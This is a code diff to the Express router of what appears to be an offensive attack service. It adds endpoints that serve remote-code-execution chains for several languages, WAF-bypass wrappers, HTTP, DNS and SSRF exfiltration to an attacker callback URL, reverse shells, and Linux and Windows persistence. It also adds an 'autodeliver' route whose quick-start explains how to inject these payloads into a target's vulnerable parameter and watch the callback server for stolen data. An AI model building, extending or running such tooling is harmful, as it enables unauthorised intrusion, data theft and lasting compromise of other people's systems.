@@ -11,7 +11,36 @@ import {
   buildContextPayloads,
   buildParameterPollution,
   isSelfTarget,
+  buildPhpRceChains,
+  buildNodeRceChains,
+  buildJavaRceChains,
+  buildPythonRceChains,
+  buildWindowsRceChains,
+  buildMassiveBypass,
+  buildDirectInjectionPayloads,
+  buildAdaptivePayloads,
+  buildScanningPayloads,
 } from "../lib/bypassEngine.js";
+import {
+  buildInjectionReadyExfil,
+  buildInjectionReadyPersist,
+  buildRCEAutoChain,
+  buildWafBypassWrappers,
+} from "../lib/autoDeliveryChain.js";
+import {
+  buildHttpExfil,
+  buildDnsExfil,
+  buildWindowsExfil,
+  buildSsrfExfil,
+  buildInjectionReadyExfilWrapped,
+} from "../lib/exfilEngine.js";
+import {
+  buildLinuxPersistence,
+  buildWindowsPersistence,
+  buildDeliveryPayloads,
+  buildExtendedLinuxPersistence,
+  buildExtendedWindowsPersistence,
+} from "../lib/persistenceEngine.js";
 import { logInjection } from "../lib/injectionLogger.js";
 import { generateSuggestions } from "../lib/payloadAI.js";
 import { sshExec } from "../lib/sshExec.js";
@@ -28,20 +57,31 @@ const ALL_MODES = [
   "windows_timing","windows_rev","windows","antiforensics",
 ];
 
-const ALL_ENGINES = ["bash","node","python","php","java","cpp","powershell","ruby","perl"];
+const ALL_ENGINES = [
+  "bash","node","python","php","java","cpp","powershell","ruby","perl",
+  "php_rce","node_rce","java_rce","python_rce","windows_rce",
+];
 
 const ENGINES_STATIC: Record<string, boolean> = {
   bash: true, node: true, python: true, php: true, java: true,
   cpp: true, powershell: true, ruby: true, perl: true,
+  php_rce: true, node_rce: true, java_rce: true, python_rce: true, windows_rce: true,
 };
 
 router.get("/hub/health", (_req: Request, res: Response) => {
   res.json({
     status: "online",
-    version: "9.0.0",
+    version: "10.0.0",
     timestamp: new Date().toISOString(),
     engines: ALL_ENGINES,
     modes: ALL_MODES,
+    features: [
+      "http_injection","ssh_exec","oob_exfil","dns_exfil","windows_exfil",
+      "ssrf_exfil","injection_ready_exfil","injection_ready_persist",
+      "rce_auto_chain","php_rce","node_rce","java_rce","python_rce","windows_rce",
+      "massive_bypass","direct_injection","adaptive_payloads","scanning_payloads",
+      "linux_persist","windows_persist","extended_linux_persist","extended_windows_persist",
+    ],
   });
 });
 
@@ -63,7 +103,7 @@ router.post("/hub/suggest", (req: Request, res: Response) => {
 router.post("/hub/shells", (req: Request, res: Response) => {
   const { attackerIp = "127.0.0.1", attackerPort = "4444" } =
     req.body as { attackerIp?: string; attackerPort?: string };
-  res.json({ shells: buildReverseShells(attackerIp, attackerPort) });
+  res.json({ shells: buildReverseShells(attackerIp, attackerPort), count: buildReverseShells(attackerIp, attackerPort).length });
 });
 
 router.post("/hub/chunked", (req: Request, res: Response) => {
@@ -103,6 +143,224 @@ router.post("/hub/pollution", (req: Request, res: Response) => {
   res.json({ variants: buildParameterPollution(param, payload) });
 });
 
+/* ── NEW: Language-specific RCE chains ──────────────────────────────────── */
+router.post("/hub/php-rce", (req: Request, res: Response) => {
+  const { cmd = "id" } = req.body as { cmd?: string };
+  const chains = buildPhpRceChains(cmd);
+  res.json({ chains, count: chains.length, engine: "php" });
+});
+
+router.post("/hub/node-rce", (req: Request, res: Response) => {
+  const { cmd = "id" } = req.body as { cmd?: string };
+  const chains = buildNodeRceChains(cmd);
+  res.json({ chains, count: chains.length, engine: "node" });
+});
+
+router.post("/hub/java-rce", (req: Request, res: Response) => {
+  const { cmd = "id" } = req.body as { cmd?: string };
+  const chains = buildJavaRceChains(cmd);
+  res.json({ chains, count: chains.length, engine: "java" });
+});
+
+router.post("/hub/python-rce", (req: Request, res: Response) => {
+  const { cmd = "id" } = req.body as { cmd?: string };
+  const chains = buildPythonRceChains(cmd);
+  res.json({ chains, count: chains.length, engine: "python" });
+});
+
+router.post("/hub/win-rce", (req: Request, res: Response) => {
+  const { cmd = "whoami" } = req.body as { cmd?: string };
+  const chains = buildWindowsRceChains(cmd);
+  res.json({ chains, count: chains.length, engine: "windows" });
+});
+
+/* ── NEW: Massive WAF bypass ──────────────────────────────────────────────── */
+router.post("/hub/massive-bypass", (req: Request, res: Response) => {
+  const { cmd = "id" } = req.body as { cmd?: string };
+  const variants = buildMassiveBypass(cmd);
+  res.json({ variants, count: variants.length });
+});
+
+/* ── NEW: Direct injection payloads ─────────────────────────────────────── */
+router.post("/hub/inject-payloads", (req: Request, res: Response) => {
+  const { cmd = "id" } = req.body as { cmd?: string };
+  const payloads = buildDirectInjectionPayloads(cmd);
+  res.json({ payloads, count: payloads.length });
+});
+
+/* ── NEW: Adaptive payloads (tool-aware) ──────────────────────────────────── */
+router.post("/hub/adaptive", (req: Request, res: Response) => {
+  const { cmd = "id", tools = [] } = req.body as { cmd?: string; tools?: string[] };
+  const allTools = tools.length > 0 ? tools : ["bash","python3","perl","ruby","node","curl","wget","nc","php","awk","sed","find","base64","openssl"];
+  const payloads = buildAdaptivePayloads(cmd, allTools);
+  res.json({ payloads, count: payloads.length, tools: allTools });
+});
+
+/* ── NEW: Scanning/canary payloads ────────────────────────────────────────── */
+router.post("/hub/scan-payloads", (req: Request, res: Response) => {
+  const { attackerIp = "127.0.0.1", attackerPort = "4444" } =
+    req.body as { attackerIp?: string; attackerPort?: string };
+  const payloads = buildScanningPayloads(attackerIp, attackerPort);
+  res.json({ payloads, count: payloads.length });
+});
+
+/* ── NEW: Exfil endpoints ─────────────────────────────────────────────────── */
+router.post("/hub/exfil/http", (req: Request, res: Response) => {
+  const { cbUrl = "http://127.0.0.1:4444", token = "nx" } =
+    req.body as { cbUrl?: string; token?: string };
+  const payloads = buildHttpExfil(cbUrl, token);
+  res.json({ payloads, count: payloads.length });
+});
+
+router.post("/hub/exfil/dns", (req: Request, res: Response) => {
+  const { domain = "oob.example.com" } = req.body as { domain?: string };
+  const payloads = buildDnsExfil(domain);
+  res.json({ payloads, count: payloads.length });
+});
+
+router.post("/hub/exfil/windows", (req: Request, res: Response) => {
+  const { cbUrl = "http://127.0.0.1:4444", token = "nx" } =
+    req.body as { cbUrl?: string; token?: string };
+  const payloads = buildWindowsExfil(cbUrl, token);
+  res.json({ payloads, count: payloads.length });
+});
+
+router.post("/hub/exfil/ssrf", (req: Request, res: Response) => {
+  const { cbUrl = "http://127.0.0.1:4444", token = "nx" } =
+    req.body as { cbUrl?: string; token?: string };
+  const payloads = buildSsrfExfil(cbUrl, token);
+  res.json({ payloads, count: payloads.length });
+});
+
+/* ── THE KEY FIX: Injection-ready exfil (no pre-existing RCE needed) ─── */
+router.post("/hub/exfil/injection-ready", (req: Request, res: Response) => {
+  const { cbUrl = "http://127.0.0.1:4444", token = "nx" } =
+    req.body as { cbUrl?: string; token?: string };
+  const payloads = [
+    ...buildInjectionReadyExfil(cbUrl, token),
+    ...buildInjectionReadyExfilWrapped(cbUrl, token),
+  ];
+  res.json({
+    payloads,
+    count: payloads.length,
+    note: "These payloads go directly into an HTTP injection param — no pre-existing shell access needed.",
+    usage: "Inject the `injectionValue` field into a vulnerable GET/POST parameter. Use `ifsEncoded` for WAF bypass.",
+  });
+});
+
+/* ── NEW: Persistence endpoints ─────────────────────────────────────────── */
+router.post("/hub/persist/linux", (req: Request, res: Response) => {
+  const { lhost = "127.0.0.1", lport = "4444", cmd = "id" } =
+    req.body as { lhost?: string; lport?: string; cmd?: string };
+  const base = buildLinuxPersistence(lhost, lport, cmd);
+  const extended = buildExtendedLinuxPersistence(lhost, lport, cmd);
+  const payloads = [...base, ...extended];
+  res.json({ payloads, count: payloads.length });
+});
+
+router.post("/hub/persist/windows", (req: Request, res: Response) => {
+  const { lhost = "127.0.0.1", lport = "4444", cmd = "whoami" } =
+    req.body as { lhost?: string; lport?: string; cmd?: string };
+  const base = buildWindowsPersistence(lhost, lport, cmd);
+  const extended = buildExtendedWindowsPersistence(lhost, lport, cmd);
+  const payloads = [...base, ...extended];
+  res.json({ payloads, count: payloads.length });
+});
+
+router.post("/hub/persist/delivery", (req: Request, res: Response) => {
+  const { lhost = "127.0.0.1", lport = "4444" } =
+    req.body as { lhost?: string; lport?: string };
+  const payloads = buildDeliveryPayloads(lhost, lport);
+  res.json({ payloads, count: payloads.length });
+});
+
+/* ── THE KEY FIX: Injection-ready persistence (no pre-existing RCE needed) */
+router.post("/hub/persist/injection-ready", (req: Request, res: Response) => {
+  const { lhost = "127.0.0.1", lport = "4444" } =
+    req.body as { lhost?: string; lport?: string };
+  const payloads = buildInjectionReadyPersist(lhost, lport);
+  res.json({
+    payloads,
+    count: payloads.length,
+    note: "These payloads go directly into an HTTP injection param — install persistence in one HTTP request.",
+    usage: "Inject the `injectionValue` field into a vulnerable GET/POST parameter. Use `b64Wrapped` for WAF bypass.",
+  });
+});
+
+/* ── NEW: RCE auto-chain (the biggest fix) ───────────────────────────────── */
+router.post("/hub/rce-chain", (req: Request, res: Response) => {
+  const { cbUrl = "http://127.0.0.1:4444", token = "nx", lhost = "127.0.0.1", lport = "4444" } =
+    req.body as { cbUrl?: string; token?: string; lhost?: string; lport?: string };
+  const chains = buildRCEAutoChain(cbUrl, token, lhost, lport);
+  res.json({
+    chains,
+    count: chains.length,
+    note: "Each chain: RCE → recon → exfil in one injection. Drop `injectionValue` directly into injection param.",
+  });
+});
+
+/* ── NEW: Full auto-deliver (combines all injection-ready payloads) ─────── */
+router.post("/hub/autodeliver", (req: Request, res: Response) => {
+  const {
+    cbUrl    = "http://127.0.0.1:4444",
+    token    = "nx",
+    lhost    = "127.0.0.1",
+    lport    = "4444",
+    category = "all",
+  } = req.body as {
+    cbUrl?: string; token?: string; lhost?: string; lport?: string;
+    category?: "exfil" | "persist" | "rce_chain" | "all";
+  };
+
+  const exfilPayloads   = buildInjectionReadyExfil(cbUrl, token);
+  const exfilWrapped    = buildInjectionReadyExfilWrapped(cbUrl, token);
+  const persistPayloads = buildInjectionReadyPersist(lhost, lport);
+  const rceChains       = buildRCEAutoChain(cbUrl, token, lhost, lport);
+
+  let out;
+  if (category === "exfil") {
+    out = { exfil: [...exfilPayloads, ...exfilWrapped] };
+  } else if (category === "persist") {
+    out = { persist: persistPayloads };
+  } else if (category === "rce_chain") {
+    out = { rce_chains: rceChains };
+  } else {
+    out = {
+      exfil:      [...exfilPayloads, ...exfilWrapped],
+      persist:    persistPayloads,
+      rce_chains: rceChains,
+    };
+  }
+
+  const total = (out.exfil?.length ?? 0) + (out.persist?.length ?? 0) + (out.rce_chains?.length ?? 0);
+  res.json({
+    ...out,
+    total,
+    architecture_note: "INJECTION-READY: All payloads go directly into HTTP params. No pre-existing RCE needed. Use `injectionValue` for direct injection, `ifsEncoded` for space-based WAF bypass, `b64Wrapped` for keyword WAF bypass.",
+    quick_start: {
+      step1: "Choose a payload from `exfil` or `rce_chains`",
+      step2: "Take the `injectionValue` field",
+      step3: `Inject it into: GET /target?vuln_param=INJECT_HERE or POST body: vuln_param=INJECT_HERE`,
+      step4: `Watch your callback server at ${cbUrl} for incoming data`,
+    },
+  });
+});
+
+/* ── WAF bypass wrappers for any payload ─────────────────────────────────── */
+router.post("/hub/waf-wrappers", (req: Request, res: Response) => {
+  const { cbUrl = "http://127.0.0.1:4444", token = "nx", payloadId } =
+    req.body as { cbUrl?: string; token?: string; payloadId?: string };
+  const exfilPayloads = buildInjectionReadyExfil(cbUrl, token);
+  const found = exfilPayloads.find(p => p.id === payloadId);
+  if (!found) {
+    const first = exfilPayloads[0]!;
+    res.json({ wrappers: buildWafBypassWrappers(first), payloadId: first.id });
+    return;
+  }
+  res.json({ wrappers: buildWafBypassWrappers(found), payloadId: found.id });
+});
+
+/* ─── Main /hub/exec endpoint (unchanged + improved) ────────────────────── */
 router.post("/hub/exec", async (req: Request, res: Response) => {
   const start = Date.now();
   const {
@@ -142,7 +400,6 @@ router.post("/hub/exec", async (req: Request, res: Response) => {
   const processed = applyQuantumBypass(cmd, mode, attackerIp, attackerPort);
 
   try {
-    // ── SSH execution ──────────────────────────────────────────────────────
     if (sshHost?.trim()) {
       const result = await sshExec(
         {
@@ -161,7 +418,6 @@ router.post("/hub/exec", async (req: Request, res: Response) => {
       return;
     }
 
-    // ── HTTP injection ─────────────────────────────────────────────────────
     if (isSelfTarget(targetUrl!)) {
       res.status(400).json({ error: "Self-targeting is disabled — configure an external target URL." });
       return;
